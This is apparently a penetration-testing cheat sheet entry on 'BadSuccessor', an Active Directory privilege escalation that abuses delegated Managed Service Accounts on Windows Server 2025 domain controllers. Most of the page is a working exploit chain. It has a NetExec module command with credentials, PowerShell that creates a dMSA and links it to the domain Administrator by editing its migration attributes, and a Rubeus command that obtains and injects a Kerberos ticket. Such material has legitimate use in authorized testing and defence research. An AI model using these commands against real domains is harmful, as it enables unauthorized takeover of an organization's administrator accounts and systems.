# Password - dMSA

Delegated Managed Service Accounts (dMSAs)

## BadSuccessor

**Requirements**:

* Windows Server 2025 Domain Controller
* Permission on any organizational unit (OU) in the domain

**Exploitation**:

* [akamai/BadSuccessor/Get-BadSuccessorOUPermissions.ps1](https://github.com/akamai/BadSuccessor)
* [GhostPack/Rubeus PR #194](https://github.com/GhostPack/Rubeus/pull/194)
* [CravateRouge/bloodyAD Commit #210f735](https://github.com/CravateRouge/bloodyAD/commit/210f735474a403dd64b218b84e98a27e157e7ed3)
* [Pennyw0rth/NetExec PR #702](https://github.com/Pennyw0rth/NetExec/pull/702/commits/e75512a93cde0c893505fd806e169a2aa7a683db)

    ```ps1
    poetry run netexec ldap 10.10.10.10 -u administrator -p Passw0rd -M badsuccessor
    ```

![badsuccessor-attack-flow](https://www.akamai.com/site/en/images/blog/2025/badsuccessor-image5.png)

**Manual Exploitation**:

* Create unfunctional dMSA

    ```ps1
    New-ADServiceAccount -Name "attacker_dmsa" -DNSHostName "dontcare.com" -CreateDelegatedServiceAccount -PrincipalsAllowedToRetrieveManagedPassword "attacker-machine$" -path "OU=temp,DC=aka,DC=test"
    ```

* Edit `msDS-ManagedAccountPrecededByLink` and `msDS-DelegatedMSAState` values

    ```ps1
    # msDS-ManagedAccountPrecededByLink, targeted user or computer
    # msDS-DelegatedMSAState=2, completed migration
    $dMSA = [ADSI]"LDAP://CN=attacker_dmsa,OU=temp,DC=aka,DC=test"
    $dMSA.Put("msDS-DelegatedMSAState", 2)
    $dMSA.Put("msDS-ManagedAccountPrecededByLink", "CN=Administrator,CN=Users,DC=aka,DC=test")
    $dMSA.SetInfo()
    ```

* dMSA authentication with Rubeus

    ```ps1
    Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/aka.test /dmsa /opsec /nowrap /ptt /ticket:<Machine TGT>
    ```

## References

* [BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory - Yuval Gordon - May 21, 2025](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
* [Operationalizing the BadSuccessor: Abusing dMSA for Domain Privilege Escalation - Arun Nair - May 23, 2025](https://medium.com/seercurity-spotlight/operationalizing-the-badsuccessor-abusing-dmsa-for-domain-privilege-escalation-429cefc36187)
